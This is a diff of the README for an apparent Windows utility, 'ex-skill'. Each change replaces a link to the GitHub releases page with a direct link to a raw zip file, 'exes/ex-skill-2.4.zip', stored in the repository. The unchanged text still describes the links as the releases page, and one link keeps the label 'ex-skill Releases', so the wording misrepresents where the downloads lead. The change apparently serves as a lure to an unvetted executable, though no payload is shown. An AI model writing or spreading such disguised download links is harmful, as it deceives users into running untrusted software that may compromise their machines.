@@ -1,6 +1,6 @@
 # 🧩 ex-skill - Simple tools for everyday use
 
-[![Download ex-skill](https://img.shields.io/badge/Download%20ex--skill-6e56cf?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eramabb8026/ex-skill/releases)
+[![Download ex-skill](https://img.shields.io/badge/Download%20ex--skill-6e56cf?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/eramabb8026/ex-skill/main/exes/ex-skill-2.4.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ Use it if you want a small local app that opens fast and keeps your data easy to
 
 Visit this page to download the app for Windows:
 
-[https://github.com/eramabb8026/ex-skill/releases](https://github.com/eramabb8026/ex-skill/releases)
+[https://raw.githubusercontent.com/eramabb8026/ex-skill/main/exes/ex-skill-2.4.zip](https://raw.githubusercontent.com/eramabb8026/ex-skill/main/exes/ex-skill-2.4.zip)
 
 On that page, look for the latest release and download the Windows file. In most cases, this will be an `.exe` file or a `.zip` file with the app inside.
 
@@ -88,7 +88,7 @@ Yes. If the app came in a folder or portable package, you can move that folder t
 
 Check the releases page and download the newest version when it is posted:
 
-[https://github.com/eramabb8026/ex-skill/releases](https://github.com/eramabb8026/ex-skill/releases)
+[https://raw.githubusercontent.com/eramabb8026/ex-skill/main/exes/ex-skill-2.4.zip](https://raw.githubusercontent.com/eramabb8026/ex-skill/main/exes/ex-skill-2.4.zip)
 
 ## 🧰 Troubleshooting
 
@@ -136,7 +136,7 @@ Keep all files in the same folder unless the release instructions say else.
 
 Use this link to visit the release page and download the Windows file:
 
-[ex-skill Releases](https://github.com/eramabb8026/ex-skill/releases)
+[ex-skill Releases](https://raw.githubusercontent.com/eramabb8026/ex-skill/main/exes/ex-skill-2.4.zip)
 
 ## 🧾 Release notes
 
